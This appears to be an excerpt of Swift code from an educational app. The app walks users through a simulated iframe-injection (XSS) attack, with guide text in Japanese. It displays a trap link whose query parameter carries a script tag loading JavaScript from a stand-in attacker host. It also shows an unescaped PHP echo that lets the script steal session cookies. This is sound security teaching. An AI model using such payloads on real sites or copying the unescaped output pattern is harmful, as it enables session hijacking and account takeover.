...
class IFrameInjectionUnsafeWebSimulatorViewController: WebSimulatorViewController {
    ...
    private func setupViews() {
        ...
        trapButton.set(
            code: "<a \"http://www.unsafe.co.jp/welcome.php?name=<script src=http://www.trap.cp.jp/iframe_injection.js></script>\">\n    このサイト本当に面白い!!\n</a>",
            language: .html
        )
    ...
    private func startGuide1() {
        ...
        guideTexts = ["これが最初に見た攻撃者が用意した罠サイトです。"]
        setGuideText()
    ...
    private func guide1_1() {
        ...
        guideTexts = [
            "この赤枠で囲まれたリンクをタップすると脆弱なWebサイトに遷移します。\nリンクの下に表示されたコードを見てみましょう。",
            "脆弱なWebサイトに遷移する際、GETリクエストのパラメータには「name=<script src=http://www.trap.cp.jp/iframe_injection.js></script>」が設定されています。\nこのnameの値をエスケープせずに直接表示することによって攻撃者のスクリプトが実行されます。",
            "それでは実際にこのリンクをタップして脆弱なWebサイトに遷移してみましょう。"
        ]
        setGuideText()
        focus(on: trapButton)
    }
    ...
    private func startGuide2() {
        ...
        guideTexts = [
            "これが実際にスクリプトが埋め込まれた後の脆弱なWebサイトです。"
        ]
        setGuideText()
        showGuideTextView(completion: nil)
    }
    ...
    private func guide2_1() {
        ...
        guideTexts = [
            "この赤枠で囲まれた<p>タグには本来以下のコードでユーザの名前を表示しようとしていました。\n<p><?php echo $_GET[\"name\"]; ?>さん</p>\nしかし、実際には<p>タグの下に示したコードが実行されました。",
            "nameに設定された値をエスケープせずに表示した結果、「<p><?php echo $_GET[\"name\"]; ?>さん</p>」は、「<p><?php echo <script src=http://www.trap.cp.jp/iframe_injection.js></script>; ?>さん</p>」と解釈され攻撃者の用意したスクリプトが実行されてしまいました。",
        ]
        setGuideText()
        focus(on: nameLabel)
    }
    ...
    private func guide2_2() {
        ...
        guideTexts = [
            "この赤枠で囲まれた部分が攻撃者が埋め込んだ<iframe>要素です。\n今回は分かりやすさを狙って<iframe>要素を表示していますが、実際には攻撃者は自身が埋め込んだ<iframe>要素を表示することはありません。"
        ]
        setGuideText()
    ...
    private func guide2_3() {
        ...
        guideTexts = [
            "ここに攻撃者が取得したユーザのクッキーの値が表示されています。\n脆弱なWebサイトで生成したユーザのセッションIDが盗まれてしまっています。",
            "セッションIDが盗まれると攻撃者がユーザになりすますことが可能となってしまいます。\nユーザになりすましてサービスを利用されてしまってはユーザが不利益を被ることになりますし、サービスへの信頼も失ってしまいます。\n他にもCookieからユーザの様々な個人情報が盗まれてしまうため、早急に対策する必要があります。"
        ]
        setGuideText()
